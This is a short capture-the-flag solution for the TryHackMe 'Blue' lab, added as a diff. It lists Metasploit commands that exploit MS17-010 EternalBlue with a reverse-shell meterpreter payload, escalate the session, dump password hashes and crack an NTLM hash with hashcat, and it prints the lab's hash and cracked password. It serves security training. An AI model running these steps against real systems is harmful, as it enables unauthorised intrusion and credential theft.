@@ -1,0 +1,31 @@
+https://chaudhary1337.github.io/p/tryhackme-blue-writeup/ for more info
+
+My Solutions
+-------------
+Recon
+1. nmap -script=vuln -sT <target ip address>
+2. msfconsole
+3. search ms17-010
+Gain Access
+4. use exploit/windows/smb/ms17_010_eternalblue
+5. show options
+6. set RHOSTS <target ip address>
+7. set payload windows/x64/meterpreter/reverse_tcp
+8. exploit
+Escalate
+9. background
+10. use post/multi/manage/shell_to_meterpreter
+11. show options
+12. set SESSION <session where eternalblue is running>
+13. exploit
+14. ps
+15. migrate <process id>
+Cracking
+16. hashdump
+17. Copy "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" into a file
+18. Download rockyou wordlist
+19. hashcat -a 0 -m 1000 <hash file> <rockyou file>
+20. We find the password to be alqfna22
+Find Flags!
+21. search -f flag*
+22. Print out contents of flags
